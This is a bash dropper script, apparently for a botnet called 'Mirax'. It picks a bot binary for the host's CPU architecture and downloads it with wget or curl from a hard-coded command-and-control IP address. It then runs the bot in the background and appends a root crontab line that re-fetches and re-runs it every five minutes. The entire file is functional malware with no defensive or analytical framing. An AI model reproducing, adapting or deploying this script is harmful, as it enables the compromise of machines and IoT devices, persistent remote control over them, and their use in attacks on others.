#!/bin/bash
# Mirax Installer Script
# Downloads and runs the appropriate bot for the target architecture

C2_HOST="85.11.167.41"
HTTP_PORT="8080"

echo "[+] Mirax Installer v1.0"
echo "[+] Downloading bot..."

# Detect architecture
ARCH=$(uname -m 2>/dev/null || echo "unknown")
echo "[+] Architecture: $ARCH"

# Choose appropriate binary
case $ARCH in
    x86_64|amd64)
        BOT="bot.x86"
        ;;
    i386|i686)
        BOT="bot.x86"
        ;;
    armv7l|armv8l)
        BOT="bot.arm"
        ;;
    aarch64|arm64)
        BOT="bot.arm64"
        ;;
    mips)
        BOT="bot.mips"
        ;;
    mipsel)
        BOT="bot.mipsel"
        ;;
    *)
        # Fallback to Python or shell
        if command -v python3 >/dev/null 2>&1; then
            BOT="bot.py"
        else
            BOT="bot.sh"
        fi
        ;;
esac

echo "[+] Using: $BOT"

# Download bot
if command -v wget >/dev/null 2>&1; then
    wget -q "http://$C2_HOST:$HTTP_PORT/$BOT" -O /tmp/bot
elif command -v curl >/dev/null 2>&1; then
    curl -s "http://$C2_HOST:$HTTP_PORT/$BOT" -o /tmp/bot
else
    echo "[-] No wget or curl found"
    exit 1
fi

# Make executable
chmod 777 /tmp/bot

# Run bot
echo "[+] Starting bot..."
if [[ "$BOT" == *.py ]]; then
    python3 /tmp/bot &
elif [[ "$BOT" == *.sh ]]; then
    /bin/sh /tmp/bot &
else
    /tmp/bot &
fi

# Add persistence
if [ -f /etc/crontab ]; then
    echo "*/5 * * * * root wget -q http://$C2_HOST:$HTTP_PORT/$BOT -O /tmp/bot && chmod 777 /tmp/bot && /tmp/bot" >> /etc/crontab
    echo "[+] Persistence added to crontab"
fi

echo "[+] Mirax bot installed!"